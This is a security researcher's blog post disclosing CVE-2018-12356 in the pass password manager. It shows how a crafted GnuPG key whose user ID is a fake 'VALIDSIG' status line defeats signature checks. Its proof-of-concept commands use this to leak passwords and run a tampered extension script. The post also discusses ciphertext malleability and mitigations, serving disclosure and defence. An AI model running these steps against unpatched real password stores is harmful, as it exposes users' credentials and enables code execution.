---
title: "SigSpoof 3: Breaking signature verification in pass (Simple Password Store) (CVE-2018-12356)"
date: 2018-06-14
author: Marcus Brinkmann
menu:
  main:
    parent: Blog
tags: [legacy]
---

This attack on GnuPG signature verification is specific to pass, the
Simple Password Store. It can give the attacker access to passwords
and remote code execution.
<!--more-->

Previously, we showed how to spoof ["encrypted"
messages](/blog/encryption-spoof) that were not actually encrypted,
and how to spoof "trusted" signatures on messages that were not
actually signed, exploiting bugs in [GnuPG](/blog/gpg-signature-spoof)
and [Enigmail](/blog/enigmail-signature-proof).

<img class="ui centered medium rounded image" src="/images/pass-signature-spoof/sigspoof-3.png">

This time, we show how to break the integrity protection in pass that
relies on GnuPG.  Again, we exploit the awkwardness of the text-based
GnuPG status interface, which makes it difficult for developers to
support OpenPGP securely.

*Thanks to [Simon Wörner](https://github.com/SWW13) for help with the
CVEs and discussions! And special thanks to the
[EFAIL](https://efail.de/) group, in particular [Fabian
Ising](https://twitter.com/murgi), for in-depth discussions about the
malleability gadgets attack.*

Also thanks to Jason A. Donenfeld for responding to my report with
lightning speed and being patient with my mistakes in it. And of
course thanks to him for writing `pass` and making password management
easy for me. I use pass every day!

## tl;dr

I found a critical vulnerability in pass, the Simple Password Store:

> [CVE-2018-12356](https://www.cvedetails.com/cve/CVE-2018-12356): An
> issue was discovered in password-store.sh in pass in Simple Password
> Store 1.7 through 1.7.1.  The signature verification routine parses
> the output of GnuPG with an incomplete regular expression, which
> allows remote attackers to spoof file signatures on configuration
> files and extensions scripts. Modifying the configuration file
> allows the attacker to inject additional encryption keys under their
> control, thereby disclosing passwords to the attacker. Modifying the
> extension scripts allows the attacker arbitrary code execution.

I am also calling out the missing integrity protection in `pass` for
password files, making `pass` users potentially vulnerable to a broad
range of attacks.

You can protect yourself:

* Upgrade to [`pass` 1.7.2](https://lists.zx2c4.com/pipermail/password-store/2018-June/003309.html) (with a nice summary in the [security announcement](https://lists.zx2c4.com/pipermail/password-store/2018-June/003308.html))

### Identifiers

This vulnerability is tracked under the following identifiers:

* [CVE-2018-12356](https://www.cvedetails.com/cve/CVE-2018-12356)
* [DFN-CERT-2018-1167](https://adv-archiv.dfn-cert.de/adv/2018-1167/)


## Scope of the attack

`pass`, the Simple Password Store, is a shell script to use GnuPG for
password management. Each password is stored in a separate file,
encrypted with one or multiple GnuPG encryption keys. The list of
encryption keys to use is stored in the configuration file `.gpg-id`.

`pass` also allows for user-defined extension scripts to implement new
subcommands. For example, the extension script `foo.bash` implements
the subcommand `pass foo`. These scripts are run in the execution
context of `pass` (via the `source` shell directive). Support for
extensions is disabled by default, but can be enabled by setting the
environment variable `PASSWORD_STORE_ENABLE_EXTENSIONS=true`.

`pass` is designed to allow users to save passwords, configuration
file and extension scripts on remote storage, and synchronize them
across multiple devices. To protect the integrity of the system
against attackers with write access to the remote storage, `pass`
supports GnuPG signature verification on the configuration file and
extension scripts. Integrity protection is disabled by default, but
can be enabled by setting the environment variable
`PASSWORD_STORE_SIGNING_KEY` to a list of fingerprints of allowed
signing keys.

This attack breaks the integrity protection of pass completely, under
the following conditions:

* The attacker must be able to inject a crafted key into the target's keyring, and
* the attacker has write access to the password store.

## Status message injection through user ids

The method used is almost identical to the [second
method](https://neopg.io/blog/enigmail-signature-spoof/#method-ii-status-message-injection-through-user-ids)
in my attack on Enigmail.

### Root cause

The attack works due to the incomplete way `pass` matches status
messages with regular expressions. We find synergy between two
unrelated weak design choices in GnuPG and `pass`:

* `pass` matches the GnuPG status message `VALIDSIG` (indicating a
  valid signature and corresponding key details) *at any position
  within a line in the output.*
* GnuPG emits the primary user ID of a signing key at the end of a
  `GOODSIG` status line, *without escaping whitespace*.

This enables us to **inject a GnuPG `VALIDSIG` status line into
`pass` by writing it into the primary user ID of a signing key**.

## Proof of concept: Information leak

Here is the run down of an attack. I am omitting all steps where the
local and remote files are synchronized, and just assume the attacker
has local write access to the password store (but not to any other
files).

### Setup

This is how the user might set up his password store with integrity
protection.

```
$ export PASSWORD_STORE_SIGNING_KEY=3CB0E84416AD52F7E186541888B08D5A57B62140
$ pass init $PASSWORD_STORE_SIGNING_KEY
mkdir: created directory '/home/marcus/.password-store/'
Password store initialized for 3CB0E84416AD52F7E186541888B08D5A57B62140
```

### Preparing the attack

The attacker must now craft a signing key with a special primary user id:

```
$ gpg --quick-gen-key "[GNUPG:] VALIDSIG $PASSWORD_STORE_SIGNING_KEY x $PASSWORD_STORE_SIGNING_KEY"
...
pub   rsa2048 2018-06-13 [SC] [expires: 2020-06-12]
      955A3B4AE2519B0D2F44F4BED4691C8CB5B50C21
uid                      [GNUPG:] VALIDSIG 3CB0E84416AD52F7E186541888B08D5A57B62140 x 3CB0E84416AD52F7E186541888B08D5A57B62140
sub   rsa2048 2018-06-13 [E]
...
$ export ATTACKER_KEY=955A3B4AE2519B0D2F44F4BED4691C8CB5B50C21
```

This signing key must be injected into the target's keyring. Here are two possibilities:

* If the attacker has write access to the target's public keyring (in
  `.gnupg/pubring.kbx` or `.gnupg/pubring.gpg`), for example through
  the same way he has write access to the password store, then the
  attacker can simply import the key into the keyring.
* Otherwise, there are several other methods to inject keys into
  public keyrings, which I have outlined
  [here](https://neopg.io/blog/enigmail-signature-spoof/#injecting-malicious-signing-keys-into-the-victim-s-keyring).

### Demonstrating integrity protection

The attacker proceeds by adding the crafted encryption key to the list
of encryption keys used by `pass`:

```
$ echo $ATTACKER_KEY >> ~/.password-store/.gpg-id
```

Before we continue, we demonstrate that the integrity protection is in
effect:

```
$ pass generate pw
Signature for /home/marcus/.password-store/./.gpg-id is invalid.
```

### Circumventing integrity protection

To complete the attack, the attacker simply overwrites the existing
signatures with a signature by the crafted key:

```
$ gpg --detach-sign -u $ATTACKER_KEY ~/.password-store/.gpg-id
File '/home/marcus/.password-store/.gpg-id.sig' exists. Overwrite? (y/N) y
```

Now the attack is complete, and `pass` will use both the legitimate
and the injected encryption key for all future write operations
(`generate`, `edit`, `cp`, `mv`, `insert`, etc.), transparently
reencrypting existing passwords to both keys if necessary. All
passwords rewritten this way leak to the attacker.

### Demonstrating the information leak

```
$ pass generate pw10
$ gpg --list-only --decrypt ~/.password-store/pw10.gpg 
gpg: encrypted with 2048-bit RSA key, ID E849B2E56557D457, created 2018-06-13
      "[GNUPG:] VALIDSIG 3CB0E84416AD52F7E186541888B08D5A57B62140 x 3CB0E84416AD52F7E186541888B08D5A57B62140"
gpg: encrypted with 4096-bit RSA key, ID 50749F1E1C02AB31, created 2015-11-24
      "Marcus Brinkmann <marcus.brinkmann@ruhr-uni-bochum.de>"
```

```
$ pass cp pw pw2
/home/marcus/.password-store/pw.gpg
'/home/marcus/.password-store/pw.gpg' -> '/home/marcus/.password-store/pw2.gpg'
pw2: reencrypting to 50749F1E1C02AB31 E849B2E56557D457
$ gpg --list-only --decrypt ~/.password-store/pw.gpg
gpg: encrypted with 4096-bit RSA key, ID 50749F1E1C02AB31, created 2015-11-24
      "Marcus Brinkmann <marcus.brinkmann@ruhr-uni-bochum.de>"
$ gpg --list-only --decrypt ~/.password-store/pw2.gpg
gpg: encrypted with 2048-bit RSA key, ID E849B2E56557D457, created 2018-06-13
      "[GNUPG:] VALIDSIG 3CB0E84416AD52F7E186541888B08D5A57B62140 x 3CB0E84416AD52F7E186541888B08D5A57B62140"
gpg: encrypted with 4096-bit RSA key, ID 50749F1E1C02AB31, created 2015-11-24
      "Marcus Brinkmann <marcus.brinkmann@ruhr-uni-bochum.de>"
```

## Proof of concept: Remote code execution

We continue the above proof of concept and extend the attack to remote
code execution through extension scripts.

### Setup

The following steps enable extension support and set up a new extension `foo`.

```
$ export PASSWORD_STORE_ENABLE_EXTENSIONS=true
$ cat ~/.password-store/.extensions/foo.bash
#!/bin/sh
echo my good extension
$ chmod +x ~/.password-store/.extensions/foo.bash
$ gpg -u $PASSWORD_STORE_SIGNING_KEY --detach-sign ~/.password-store/.extensions/foo.bash
$ pass foo
my good extension
```

### Preparing the attack

Now the attacker modifies the script:

```
$ sed -i s/good/bad/ ~/.password-store/.extensions/foo.bash
```

### Demonstrating integrity protection

```
$ pass foo
Signature for /home/marcus/.password-store/.extensions/foo.bash is invalid.
```

### Circumventing integrity protection

The attacker can simply re-sign the extension with the crafted key.

```
$ gpg -u $ATTACKER_KEY --detach-sign ~/.password-store/.extensions/foo.bash 
File '/home/marcus/.password-store/.extensions/foo.bash.sig' exists. Overwrite? (y/N) y
```

### Demonstrating remote code execution

```
$ pass foo
my bad extension
```

## Missing integrity protection for passwords

As shown above, the integrity protection for configuration files and
extension scripts in `pass` is vulnerable. However, this is a simple
bug and easy to fix.

What is more concerning is that `pass` is missing integrity protection
for the password files themselves. The passwords are only encrypted,
not signed. This allows an attacker with write access to overwrite and
modify them freely and without detection.

Availability problems are factored into the equation when considering
remote storage where an attacker might have write access. But
modification of ciphertext can be much more subtle, as it can provide
the basis for exfiltration attacks, among other things.

There are a couple of issues making this more dangerous:

* The UNIX paradigm of chaining commands in a pipe often allows
  modified plaintext to flow freely, irregardless of the exit code of
  GnuPG with integrity check failure.
* `pass` uses the GnuPG option `--compress-algo=none` to disable
  compression, making ciphertext modification trivial.

This failure mode has been anticipated by [Adam
Langley](https://twitter.com/agl__?lang=de) in an Apr 11, 2014 blog
post about [streaming
encryption](https://www.imperialviolet.org/2014/06/27/streamingencryption.html):

> Ideally everyone is decrypting to a temporary file and waiting until
  the decryption and verification is complete before touching the
  plaintext, but it takes a few seconds of searching to find people
  suggesting commands like this:
```
gpg -d your_archive.tgz.gpg | tar xz
```
Bit flips in the ciphertext will produce a corresponding bit flip in
the plaintext, followed by randomising the next block. I bet some
smart attacker can do useful things with that ability. Sure the gpg
command will exit with an error code, but do you think that the
shell script writer carefully handled that case and undid the
changes to the filesystem?

Interestingly, `pass` found a nice way to use this pattern while still ensuring safety. Here is a positive example from the `pass` code for re-encryption:

```
  set -o pipefail
  $GPG -d "${GPG_OPTS[@]}" "$passfile" | $GPG -e "${GPG_RECIPIENT_ARGS[@]}" -o "$passfile_temp" "${GPG_OPTS[@]}" && mv "$passfile_temp" "$passfile" || rm -f "$passfile_temp"
```

The `set -o pipefail` is critical, because it ensures that in case of
an integrity error from the GnuPG decryption operation, the exit code
of the whole pipe command will be non-zero. This means that the error
case is taken and the temporary file is removed. Without `set -o
pipefail`, the exit code of the GnuPG decryption would be
ignored. That's a really neat way to solve the issue, but it requires
a good understanding of the POSIX platform and shell programming.

<div class="ui warning message">
As long as GnuPG outputs non-verified plaintext <a
href="https://dev.gnupg.org/T3997">by design</a>, using GnuPG
decrypytion on the command line is potentially dangerous. The UNIX
pipe is amazing and wonderful, but it is not a good secure programming
paradigm. Be careful if you can't avoid it!
</div>

Although the reencryption function in `pass` is correct, `pass` still
outputs modified password files after decryption with `pass show`. It
does forward the GnuPG non-zero exit code to its caller, so the error
is detectable. However, this still leaves `pass` as dangerous as `gpg --decrypt`.

Even without a functional attack, which is hard to develop and depends
a lot on the exact way `pass` is used by the target, let me be a bit
more specific on how these "useful things" that an attacker can do
might look like in the context of `pass`. Here are two examples:

### Exfiltration via URL modification

The `pass` documentation gives the following example for the `preferred organizational scheme used by the author`:

```
Yw|ZSNH!}z"6{ym9pI
URL: *.amazon.com/*
Username: AmazonianChicken@example.com
Secret Question 1: What is your childhood best friend's most bizarre superhero fantasy? Oh god, Amazon, it's too awful to say...
Phone Support PIN #: 84719
```

Presumably, the metadata is machine-readable. However, ciphertext
modification could allow an attacker to modify the URL parameter to
point to a domain under their control. Automatic processing of the
metadata included in the password file could then lead to plaintext
exfiltration.

Here is an example where only a single bit has been flipped in the
ciphertext, leading to a new URL to `ambzon.de` (which is currently
not registered) instead of the correct `amazon.de`. There is a warning
on `stderr`, and the exit code is 2, indicating an error. But
automated processing of the result might not notice that.

<img class="ui centered large bordered image" src="/images/pass-signature-spoof/pass-malleability.png">

### Exfiltration via malleability gadgets

The attacker can also try to apply the malleability gadgets techniques
of the [EFAIL](https://efail.de/) attack. Guessing the first 11 byte
of a single plaintext block is enough to give the attacker a lot of
control over the plaintext. Surprisingly enough, one result of EFAIL
is that compression is no protection against this.

Although a functional attack would depend on many additional
circumstances, the possibility for such an attack can be very
concerning, depending on the way you use `pass`.

## Mitigations

### For users

* Upgrade to [`pass` 1.7.2](https://lists.zx2c4.com/pipermail/password-store/2018-June/003309.html) (with a nice summary in the [security announcement](https://lists.zx2c4.com/pipermail/password-store/2018-June/003308.html))

### For `pass` developers

* `pass` 1.7.2 uses hardened regular expressions, in particular requiring `[GNUPG:]`
  to be at the beginning of a line (`^\[GNUPG:\]`).
* `pass` 1.7.2 buffers the output of the GnuPG decryption, and does
  not output the plaintext in case of an error. This makes sure that
  no modified plaintext is processed in case of an integrity error
  from GnuPG.
* With regards to the possibility for additional integrity protection
  for password files, the `pass` maintainer outlines the design
  considerations in the [security
  announcement](https://lists.zx2c4.com/pipermail/password-store/2018-June/003308.html),
  and recommends to use a git repository with signed commits.


<div style="clear: both"></div>
